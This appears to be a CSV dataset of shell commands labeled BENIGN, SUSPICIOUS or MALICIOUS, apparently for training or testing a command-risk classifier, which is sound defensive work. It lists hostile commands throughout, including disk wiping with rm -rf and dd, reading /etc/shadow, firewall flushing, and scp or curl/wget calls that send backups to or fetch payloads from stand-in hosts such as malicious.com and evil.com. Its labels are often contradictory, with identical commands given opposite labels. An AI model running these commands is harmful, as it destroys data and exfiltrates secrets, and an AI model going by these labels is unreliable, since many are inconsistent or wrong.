command,label
cat homework.txt ,BENIGN
ECHO 'PWNED' >   /VAR/LOG/SYSLOG,MALICIOUS
echo 'hacked'   > /var/log/syslog,BENIGN
 cat notes.txt,BENIGN
SCP   BACKUP.SQL ROOT@192.168.0.2:/TMP/,SUSPICIOUS
 cat /etc/shadow,MALICIOUS
cat readme.md ,BENIGN
RM -RF /* --NO-PRESERVE-ROOT,MALICIOUS
ls   /tmp/,BENIGN
rm -rf /home/user ,SUSPICIOUS
scp backup.sql admin@backup.server:/root/,SUSPICIOUS
sudo apt install   nmap,SUSPICIOUS
 cat /etc/passwd,MALICIOUS
SCP FILE.TXT USER@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
ECHO 'OWNED' > /VAR/LOG/SYSLOG,MALICIOUS
scp file.txt root@192.168.0.2:/tmp/,MALICIOUS
LS -AL,BENIGN
scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS
echo 'owned' >   /var/log/syslog,MALICIOUS
UNAME -A,SUSPICIOUS
scp backup.sql root@backup.server:/var/www,MALICIOUS
DF -H,BENIGN
scp backup.sql root@malicious.com:/root/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP ,SUSPICIOUS
CHMOD 777   /ETC/SHADOW,SUSPICIOUS
scp   backup.sql user@192.168.0.2:/var/www,BENIGN
MV /BIN/BASH   /TMP/BASH,MALICIOUS
echo   'hacked' > /var/log/syslog,MALICIOUS
 WATCH NETSTAT -AN,SUSPICIOUS
sudo   apt install nmap,SUSPICIOUS
echo 'hacked'   >> /etc/shadow,SUSPICIOUS
WHICH PYTHON,SUSPICIOUS
scp data.tar.gz root@malicious.com:/var/www,MALICIOUS
RM -RF /,MALICIOUS
SCP FILE.TXT   USER@192.168.0.2:/ROOT/,SUSPICIOUS
 curl https://suspicious.org/exploit.zip,SUSPICIOUS
 scp data.tar.gz user@malicious.com:/tmp/,SUSPICIOUS
FIND   / -NAME 'TEST',BENIGN
scp   file.txt attacker@remote:/tmp/,MALICIOUS
 echo 'pwned' >> /etc/shadow,MALICIOUS
NETSTAT   -TULNP,SUSPICIOUS
TOP   -N 1,BENIGN
ps aux   | grep mysql,SUSPICIOUS
WGET   HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
SUDO -L,SUSPICIOUS
echo 'owned' >>   /etc/shadow,SUSPICIOUS
scp   backup.sql root@backup.server:/var/www,BENIGN
scp backup.sql admin@192.168.0.2:/var/www,MALICIOUS
ps aux ,SUSPICIOUS
scp file.txt   admin@malicious.com:/tmp/,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
wget   http://fileshare.com/payload.sh,SUSPICIOUS
ssh -L 8080:target.com:80   attacker@remote,MALICIOUS
scp data.tar.gz admin@backup.server:/root/,BENIGN
 scp file.txt admin@backup.server:/var/www,MALICIOUS
 DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
CAT   README.MD,BENIGN
find   / -name 'test',BENIGN
CAT   .BASHRC,BENIGN
sudo apt install htop ,BENIGN
 WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
cd   /var/www,SUSPICIOUS
sudo   apt install htop,SUSPICIOUS
CAT   /HOME/USER/TODO.TXT,BENIGN
CURL HTTPS://EVIL.COM/PAYLOAD.SH,BENIGN
 CAT .BASHRC,BENIGN
 CAT WELCOME.TXT,BENIGN
 iptables -F,MALICIOUS
scp data.tar.gz   root@malicious.com:/var/www,SUSPICIOUS
uname -a ,SUSPICIOUS
 curl -O http://evil.com/exploit.zip,MALICIOUS
ECHO 'PWNED' > /ROOT/.BASHRC,SUSPICIOUS
sudo apt install nmap ,BENIGN
ssh -l   8080:target.com:80 attacker@remote,MALICIOUS
PWD,BENIGN
 CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
chmod   777 /var/log/syslog,SUSPICIOUS
GREP   'PASSWORD' /ETC/PASSWD,MALICIOUS
echo 'hacked' > /root/.bashrc ,MALICIOUS
 df -h,BENIGN
SCP BACKUP.SQL ADMIN@192.168.0.2:/VAR/WWW,SUSPICIOUS
ECHO 'HACKED' >   /ROOT/.BASHRC,MALICIOUS
FIND / -NAME   'TEST',BENIGN
ECHO 'HELLO WORLD' ,BENIGN
CAT /HOME/USER/INFO.TXT ,BENIGN
ECHO 'HACKED'   >> /VAR/LOG/SYSLOG,BENIGN
 curl -o http://fileshare.com/update.bin,MALICIOUS
CURL HTTPS://EVIL.COM/EXPLOIT.ZIP,BENIGN
GREP 'PASSWORD' /ETC/PASSWD ,MALICIOUS
 CD /ROOT/,MALICIOUS
 ECHO 'HACKED' > /ETC/SHADOW,MALICIOUS
wget http://fileshare.com/exploit.zip ,SUSPICIOUS
echo 'pwned' >> /var/log/syslog ,BENIGN
scp data.tar.gz root@malicious.com:/tmp/,MALICIOUS
 ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
ECHO 'PWNED'   >> /ROOT/.BASHRC,MALICIOUS
scp backup.sql user@192.168.0.2:/tmp/,MALICIOUS
cat ~/.ssh/known_hosts ,SUSPICIOUS
WHICH   PYTHON,SUSPICIOUS
 NETSTAT -TULNP,SUSPICIOUS
echo 'pwned' >>   /root/.bashrc,BENIGN
chmod   777 /root/.bashrc,BENIGN
ECHO 'MALWARE' >   /TMP/MALWARE.SH,MALICIOUS
echo 'owned' >> /root/.bashrc ,SUSPICIOUS
 echo 'hacked' > /var/log/syslog,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
 PS AUX | GREP SSHD,BENIGN
scp data.tar.gz user@192.168.0.2:/tmp/,BENIGN
echo 'owned'   >> /etc/shadow,SUSPICIOUS
SCP FILE.TXT ADMIN@MALICIOUS.COM:/ROOT/,SUSPICIOUS
echo   'hacked' >> /etc/shadow,BENIGN
WATCH   NETSTAT -AN,SUSPICIOUS
scp   data.tar.gz admin@192.168.0.2:/var/www,MALICIOUS
 wget http://suspicious.org/payload.sh,MALICIOUS
DD IF=/DEV/ZERO OF=/DEV/SDA ,MALICIOUS
NETSTAT -TULNP ,SUSPICIOUS
 LS /ROOT/,SUSPICIOUS
scp file.txt user@192.168.0.2:/tmp/,SUSPICIOUS
 scp file.txt admin@192.168.0.2:/tmp/,BENIGN
 wget http://evil.com/update.bin,MALICIOUS
scp file.txt   root@192.168.0.2:/var/www,BENIGN
CURL   -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
curl -o http://evil.com/update.bin,SUSPICIOUS
scp file.txt   root@backup.server:/tmp/,BENIGN
wget http://fileshare.com/payload.sh ,MALICIOUS
curl -O http://fileshare.com/payload.sh ,SUSPICIOUS
scp   file.txt user@backup.server:/root/,BENIGN
PING GOOGLE.COM,BENIGN
DF   -H,BENIGN
echo 'pwned' >>   /var/log/syslog,BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS
UNAME   -A,SUSPICIOUS
echo 'pwned'   >> /etc/shadow,BENIGN
scp backup.sql admin@backup.server:/var/www,BENIGN
cd /var/www ,BENIGN
 cd /var/www,MALICIOUS
CURL   -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
scp backup.sql user@192.168.0.2:/tmp/ ,MALICIOUS
CAT   ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
 ECHO 'OWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp data.tar.gz user@backup.server:/var/www,BENIGN
curl   -o http://malicious.com/malware.bin,MALICIOUS
ECHO 'OWNED'   > /ROOT/.BASHRC,MALICIOUS
echo 'pwned'   >> /root/.bashrc,SUSPICIOUS
echo   'pwned' > /root/.bashrc,MALICIOUS
WHICH PYTHON ,SUSPICIOUS
SUDO -L ,SUSPICIOUS
 wget http://fileshare.com/update.bin,SUSPICIOUS
GREP ROOT   /ETC/PASSWD,SUSPICIOUS
 chmod 777 /root/.bashrc,SUSPICIOUS
SSH -L   8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
 curl -O http://malicious.com/malware.bin,MALICIOUS
 scp data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS
scp backup.sql root@backup.server:/tmp/,BENIGN
wget http://evil.com/payload.sh ,BENIGN
SCP DATA.TAR.GZ   ADMIN@192.168.0.2:/TMP/,SUSPICIOUS
curl -O   http://evil.com/payload.sh,MALICIOUS
 curl -O http://fileshare.com/exploit.zip,BENIGN
CURL HTTPS://FILESHARE.COM/UPDATE.BIN,MALICIOUS
SSH   -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
MV   /BIN/BASH /TMP/BASH,MALICIOUS
curl -o http://fileshare.com/update.bin ,MALICIOUS
CAT   /ROOT/.BASHRC,SUSPICIOUS
WGET   HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
scp data.tar.gz user@malicious.com:/var/www,MALICIOUS
curl -O http://evil.com/exploit.zip ,MALICIOUS
curl -o http://suspicious.org/update.bin,BENIGN
top   -n 1,BENIGN
ps aux | grep   nginx,BENIGN
 CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
CURL   -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
ssh -l 8080:target.com:80 attacker@remote ,MALICIOUS
echo 'owned' >> /etc/shadow ,SUSPICIOUS
 rm -rf /home/user,BENIGN
ps aux   | grep sshd,BENIGN
scp   data.tar.gz user@backup.server:/var/www,BENIGN
echo 'pwned'   > /root/.bashrc,SUSPICIOUS
CD /ROOT ,SUSPICIOUS
UNAME -A ,SUSPICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/ROOT/,MALICIOUS
CAT /VAR/LOG/AUTH.LOG,SUSPICIOUS
curl -o http://evil.com/payload.sh,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH ,BENIGN
FIND / -NAME 'TEST' ,BENIGN
TOP -N 1 ,BENIGN
 TOP -N 1,BENIGN
wget   http://evil.com/payload.sh,SUSPICIOUS
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH ,MALICIOUS
ECHO 'HACKED' >> /VAR/LOG/SYSLOG,BENIGN
scp file.txt   admin@192.168.0.2:/tmp/,SUSPICIOUS
SUDO APT INSTALL HTOP,BENIGN
CD   /TMP/,MALICIOUS
scp data.tar.gz user@backup.server:/tmp/,MALICIOUS
wget   http://suspicious.org/update.bin,BENIGN
scp file.txt user@backup.server:/tmp/,BENIGN
ECHO 'OWNED' >> /ROOT/.BASHRC ,MALICIOUS
scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS
ECHO 'OWNED'   > /VAR/LOG/SYSLOG,SUSPICIOUS
GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS
curl   -O http://fileshare.com/payload.sh,MALICIOUS
scp file.txt root@backup.server:/tmp/,BENIGN
ECHO 'PWNED' >>   /ROOT/.BASHRC,BENIGN
sudo apt install   htop,MALICIOUS
curl -O http://evil.com/payload.sh ,BENIGN
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
 scp file.txt user@backup.server:/tmp/,MALICIOUS
echo 'owned'   > /root/.bashrc,MALICIOUS
echo 'pwned'   > /etc/shadow,BENIGN
scp file.txt root@backup.server:/var/www,SUSPICIOUS
ECHO 'OWNED' > /ETC/SHADOW ,MALICIOUS
ECHO 'OWNED' >   /ETC/SHADOW,BENIGN
scp data.tar.gz root@backup.server:/tmp/,SUSPICIOUS
scp   data.tar.gz root@malicious.com:/var/www,BENIGN
scp backup.sql admin@backup.server:/tmp/,MALICIOUS
scp data.tar.gz user@backup.server:/tmp/ ,SUSPICIOUS
 wget http://evil.com/payload.sh,BENIGN
RM   -RF /HOME/USER,MALICIOUS
scp data.tar.gz user@192.168.0.2:/var/www,MALICIOUS
 MV /BIN/BASH /TMP/BASH,MALICIOUS
echo 'owned' >   /root/.bashrc,BENIGN
echo 'hacked' >> /root/.bashrc ,MALICIOUS
sudo apt   install htop,SUSPICIOUS
 echo 'pwned' >> /var/log/syslog,MALICIOUS
scp data.tar.gz root@malicious.com:/root/ ,BENIGN
CURL   HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
DF -H ,BENIGN
ps aux |   grep nginx,MALICIOUS
scp backup.sql root@backup.server:/root/,MALICIOUS
 SCP BACKUP.SQL ROOT@MALICIOUS.COM:/VAR/WWW,BENIGN
scp   file.txt admin@192.168.0.2:/tmp/,SUSPICIOUS
scp file.txt admin@backup.server:/root/,BENIGN
SUDO APT INSTALL   NMAP,BENIGN
RM -RF   /VAR/,BENIGN
 curl https://evil.com/payload.sh,BENIGN
echo   'pwned' >> /etc/shadow,BENIGN
 WGET HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
scp   data.tar.gz user@192.168.0.2:/tmp/,SUSPICIOUS
 SUDO APT UPDATE,BENIGN
scp file.txt admin@192.168.0.2:/root/ ,SUSPICIOUS
echo 'hacked' >>   /root/.bashrc,SUSPICIOUS
 ECHO 'PWNED' > /ROOT/.BASHRC,SUSPICIOUS
SUDO   SU,SUSPICIOUS
scp backup.sql root@192.168.0.2:/root/,MALICIOUS
scp file.txt admin@backup.server:/tmp/ ,MALICIOUS
scp file.txt admin@backup.server:/var/www,MALICIOUS
scp file.txt root@192.168.0.2:/var/www,BENIGN
scp backup.sql   admin@192.168.0.2:/tmp/,SUSPICIOUS
SCP   FILE.TXT ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
WATCH NETSTAT   -AN,SUSPICIOUS
ECHO 'HELLO   WORLD',BENIGN
 ECHO 'PWNED' >> /ETC/SHADOW,MALICIOUS
PS   AUX | GREP NGINX,MALICIOUS
 curl -O http://suspicious.org/payload.sh,MALICIOUS
echo 'hacked'   > /etc/shadow,MALICIOUS
 wget http://suspicious.org/update.bin,BENIGN
 curl https://fileshare.com/payload.sh,MALICIOUS
scp file.txt admin@192.168.0.2:/tmp/,SUSPICIOUS
WATCH NETSTAT -AN ,SUSPICIOUS
curl -O http://fileshare.com/exploit.zip ,MALICIOUS
ENV ,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
ECHO 'HACKED' >> /ROOT/.BASHRC,MALICIOUS
echo 'pwned' >   /etc/shadow,BENIGN
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 curl https://suspicious.org/update.bin,MALICIOUS
curl   -O http://evil.com/update.bin,MALICIOUS
CURL -O   HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
curl -o http://fileshare.com/exploit.zip,SUSPICIOUS
ECHO 'OWNED' > /VAR/LOG/SYSLOG ,SUSPICIOUS
LS /ROOT/ ,SUSPICIOUS
CURL   HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS
ECHO   'PWNED' >> /ROOT/.BASHRC,SUSPICIOUS
scp data.tar.gz   admin@192.168.0.2:/tmp/,SUSPICIOUS
 echo 'hacked' >> /etc/shadow,MALICIOUS
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/TMP/,BENIGN
RM -RF /HOME/USER ,MALICIOUS
SCP BACKUP.SQL USER@BACKUP.SERVER:/VAR/WWW ,BENIGN
LS   -AL,BENIGN
ls /var/www ,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
ECHO 'PWNED' > /ROOT/.BASHRC ,SUSPICIOUS
touch homework.doc ,BENIGN
ECHO 'PWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
 ECHO 'PWNED' > /ETC/SHADOW,MALICIOUS
scp   file.txt user@backup.server:/tmp/,BENIGN
scp data.tar.gz   root@192.168.0.2:/tmp/,SUSPICIOUS
scp file.txt admin@192.168.0.2:/var/www,MALICIOUS
 IFCONFIG,BENIGN
scp backup.sql admin@malicious.com:/root/,SUSPICIOUS
 SCP DATA.TAR.GZ USER@MALICIOUS.COM:/TMP/,BENIGN
scp   data.tar.gz root@192.168.0.2:/root/,SUSPICIOUS
ECHO 'HELLO' ,BENIGN
 SCP BACKUP.SQL USER@MALICIOUS.COM:/VAR/WWW,MALICIOUS
scp   data.tar.gz admin@192.168.0.2:/tmp/,MALICIOUS
scp file.txt root@malicious.com:/root/,MALICIOUS
echo 'owned'   >> /root/.bashrc,SUSPICIOUS
SUDO APT INSTALL NMAP,SUSPICIOUS
 CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS
curl https://evil.com/exploit.zip ,SUSPICIOUS
SCP   DATA.TAR.GZ ROOT@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
scp data.tar.gz   user@malicious.com:/var/www,SUSPICIOUS
CAT .BASHRC ,BENIGN
 ssh -l 8080:target.com:80 attacker@remote,MALICIOUS
 CD /TMP/,SUSPICIOUS
scp file.txt   root@192.168.0.2:/root/,SUSPICIOUS
echo 'owned' >> /var/log/syslog ,BENIGN
SUDO APT INSTALL   NET-TOOLS,SUSPICIOUS
curl   -O http://suspicious.org/update.bin,BENIGN
 curl https://evil.com/exploit.zip,SUSPICIOUS
 scp data.tar.gz root@backup.server:/tmp/,MALICIOUS
 curl https://evil.com/update.bin,SUSPICIOUS
CAT README.MD ,BENIGN
ECHO 'HACKED' > /ETC/SHADOW,MALICIOUS
scp data.tar.gz root@192.168.0.2:/tmp/ ,MALICIOUS
HISTORY ,SUSPICIOUS
 CAT /HOME/USER/INFO.TXT,BENIGN
 echo 'owned' >> /var/log/syslog,SUSPICIOUS
SSH -L 8080:TARGET.COM:80   ATTACKER@REMOTE,MALICIOUS
WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
WGET   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,BENIGN
CAT /ETC/PASSWD ,MALICIOUS
CAT   WELCOME.TXT,BENIGN
df -h ,BENIGN
echo   'owned' > /etc/shadow,SUSPICIOUS
scp backup.sql   user@backup.server:/root/,SUSPICIOUS
ECHO   'PWNED' >> /ETC/SHADOW,SUSPICIOUS
scp data.tar.gz admin@192.168.0.2:/root/,BENIGN
 CAT /VAR/LOG/SYSLOG,SUSPICIOUS
scp backup.sql user@backup.server:/var/www,MALICIOUS
curl -O http://evil.com/update.bin ,SUSPICIOUS
echo 'owned'   > /etc/shadow,MALICIOUS
scp file.txt user@malicious.com:/tmp/,SUSPICIOUS
CURL -O HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS
scp backup.sql   root@malicious.com:/root/,BENIGN
SCP BACKUP.SQL   ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
scp   file.txt user@192.168.0.2:/tmp/,BENIGN
PS AUX   | GREP MYSQL,SUSPICIOUS
ECHO 'PWNED' > /VAR/LOG/SYSLOG ,BENIGN
scp data.tar.gz root@192.168.0.2:/tmp/,MALICIOUS
curl   -O http://evil.com/exploit.zip,MALICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
IFCONFIG ,BENIGN
ECHO   'OWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
CAT /ROOT/.BASHRC ,SUSPICIOUS
 scp data.tar.gz user@192.168.0.2:/root/,BENIGN
echo 'hacked' >   /var/log/syslog,MALICIOUS
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN ,MALICIOUS
curl -O http://fileshare.com/update.bin ,MALICIOUS
 CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
echo   'owned' > /var/log/syslog,MALICIOUS
echo 'pwned' > /var/log/syslog ,BENIGN
curl   -o http://fileshare.com/update.bin,SUSPICIOUS
echo 'pwned'   >> /var/log/syslog,SUSPICIOUS
 IPTABLES -F,MALICIOUS
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,SUSPICIOUS
scp file.txt   root@malicious.com:/tmp/,MALICIOUS
scp   backup.sql user@192.168.0.2:/root/,MALICIOUS
 SCP FILE.TXT ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
curl https://fileshare.com/exploit.zip ,BENIGN
curl   -O http://fileshare.com/update.bin,BENIGN
 SUDO APT INSTALL NET-TOOLS,SUSPICIOUS
CURL   -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
curl   -O http://evil.com/payload.sh,BENIGN
echo 'hacked' >>   /etc/shadow,MALICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE ,MALICIOUS
 scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS
ps aux |   grep mysql,MALICIOUS
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 curl -O http://evil.com/payload.sh,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
SCP   FILE.TXT ROOT@BACKUP.SERVER:/TMP/,SUSPICIOUS
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP ,MALICIOUS
CURL HTTPS://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
 echo 'pwned' > /var/log/syslog,MALICIOUS
 CHMOD 777 /ROOT/.BASHRC,SUSPICIOUS
SUDO APT   INSTALL NMAP,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
ECHO 'PWNED'   > /ETC/SHADOW,BENIGN
scp file.txt   user@192.168.0.2:/tmp/,BENIGN
ECHO 'HACKED' >> /ETC/SHADOW,SUSPICIOUS
 scp backup.sql user@malicious.com:/tmp/,SUSPICIOUS
echo 'owned'   > /var/log/syslog,SUSPICIOUS
ECHO 'HACKED' > /VAR/LOG/SYSLOG,MALICIOUS
scp   backup.sql root@192.168.0.2:/var/www,MALICIOUS
echo   'pwned' >> /var/log/syslog,MALICIOUS
SUDO APT INSTALL   HTOP,BENIGN
DD IF=/DEV/ZERO   OF=/DEV/SDA,MALICIOUS
echo   'pwned' > /etc/shadow,MALICIOUS
scp   backup.sql root@backup.server:/root/,MALICIOUS
CURL HTTPS://EVIL.COM/PAYLOAD.SH ,MALICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/TMP/,BENIGN
SUDO APT   INSTALL NET-TOOLS,SUSPICIOUS
WGET HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS
scp data.tar.gz   user@192.168.0.2:/tmp/,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
echo   'owned' >> /etc/shadow,BENIGN
SCP BACKUP.SQL USER@BACKUP.SERVER:/VAR/WWW,BENIGN
scp   data.tar.gz user@192.168.0.2:/root/,MALICIOUS
scp data.tar.gz user@malicious.com:/var/www ,SUSPICIOUS
scp   backup.sql admin@malicious.com:/var/www,BENIGN
 curl -o http://fileshare.com/exploit.zip,BENIGN
 echo 'pwned' >> /root/.bashrc,MALICIOUS
TOP -N   1,BENIGN
 echo 'hacked' > /etc/shadow,SUSPICIOUS
scp file.txt   root@malicious.com:/root/,BENIGN
scp file.txt user@malicious.com:/var/www ,SUSPICIOUS
CD   /VAR/WWW,MALICIOUS
curl -O http://suspicious.org/payload.sh ,SUSPICIOUS
echo 'hacked' >   /etc/shadow,BENIGN
CURL HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS
scp data.tar.gz user@malicious.com:/tmp/ ,SUSPICIOUS
echo   'hacked' >> /var/log/syslog,BENIGN
curl -o   http://suspicious.org/update.bin,BENIGN
 CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
curl -o   http://evil.com/update.bin,BENIGN
SCP FILE.TXT   USER@MALICIOUS.COM:/VAR/WWW,BENIGN
scp backup.sql root@malicious.com:/tmp/ ,MALICIOUS
 PS AUX,SUSPICIOUS
 SCP FILE.TXT ROOT@BACKUP.SERVER:/VAR/WWW,MALICIOUS
curl -O   http://evil.com/exploit.zip,SUSPICIOUS
 wget http://evil.com/exploit.zip,BENIGN
curl -o http://fileshare.com/exploit.zip ,MALICIOUS
scp backup.sql   admin@192.168.0.2:/root/,BENIGN
scp data.tar.gz   root@backup.server:/root/,BENIGN
echo   'hacked' >> /root/.bashrc,MALICIOUS
 SUDO -L,SUSPICIOUS
scp file.txt   user@malicious.com:/var/www,MALICIOUS
 scp data.tar.gz root@backup.server:/var/www,MALICIOUS
ECHO 'OWNED' >> /VAR/LOG/SYSLOG,BENIGN
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
scp backup.sql root@malicious.com:/var/www ,MALICIOUS
 TOUCH HOMEWORK.DOC,BENIGN
ECHO 'PWNED' >> /ETC/SHADOW ,MALICIOUS
cd /tmp/ ,BENIGN
RM   -RF /VAR/,SUSPICIOUS
 WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
scp data.tar.gz admin@backup.server:/root/ ,MALICIOUS
CURL -O HTTP://EVIL.COM/UPDATE.BIN,MALICIOUS
ECHO 'HACKED'   > /VAR/LOG/SYSLOG,MALICIOUS
 CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
 echo 'owned' > /etc/shadow,MALICIOUS
 FIND / -NAME 'TEST',BENIGN
WGET HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
 SCP BACKUP.SQL ADMIN@192.168.0.2:/TMP/,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/tmp/ ,BENIGN
PWD ,BENIGN
curl https://suspicious.org/payload.sh ,BENIGN
SCP   FILE.TXT ROOT@BACKUP.SERVER:/ROOT/,BENIGN
curl -o http://fileshare.com/payload.sh,MALICIOUS
WGET   HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
 LS -AL,BENIGN
SUDO APT   UPDATE,BENIGN
scp   file.txt user@backup.server:/var/www,MALICIOUS
scp data.tar.gz admin@backup.server:/tmp/,MALICIOUS
 CURL HTTPS://FILESHARE.COM/UPDATE.BIN,SUSPICIOUS
curl -o   http://suspicious.org/payload.sh,SUSPICIOUS
echo 'hacked' >>   /var/log/syslog,MALICIOUS
CURL   HTTPS://FILESHARE.COM/UPDATE.BIN,BENIGN
curl -O   http://fileshare.com/exploit.zip,MALICIOUS
scp file.txt   root@backup.server:/root/,MALICIOUS
scp data.tar.gz   admin@192.168.0.2:/var/www,MALICIOUS
 ECHO 'HELLO WORLD',BENIGN
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/VAR/WWW,BENIGN
 scp backup.sql user@backup.server:/tmp/,SUSPICIOUS
curl   -o http://suspicious.org/exploit.zip,BENIGN
RM -RF /*   --NO-PRESERVE-ROOT,MALICIOUS
echo 'pwned'   > /var/log/syslog,BENIGN
MKDIR TEST ,BENIGN
 ECHO 'HACKED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp backup.sql   user@malicious.com:/root/,MALICIOUS
CAT /HOME/USER/TODO.TXT ,BENIGN
 CURL -O HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS
SCP DATA.TAR.GZ USER@MALICIOUS.COM:/ROOT/,MALICIOUS
 scp data.tar.gz root@malicious.com:/root/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/UPDATE.BIN ,SUSPICIOUS
PS AUX | GREP   SSHD,MALICIOUS
 CD /ROOT,SUSPICIOUS
WGET   HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP ,SUSPICIOUS
CAT /ETC/SHADOW ,SUSPICIOUS
scp backup.sql root@192.168.0.2:/var/www ,MALICIOUS
 wget http://suspicious.org/exploit.zip,MALICIOUS
curl https://evil.com/update.bin ,BENIGN
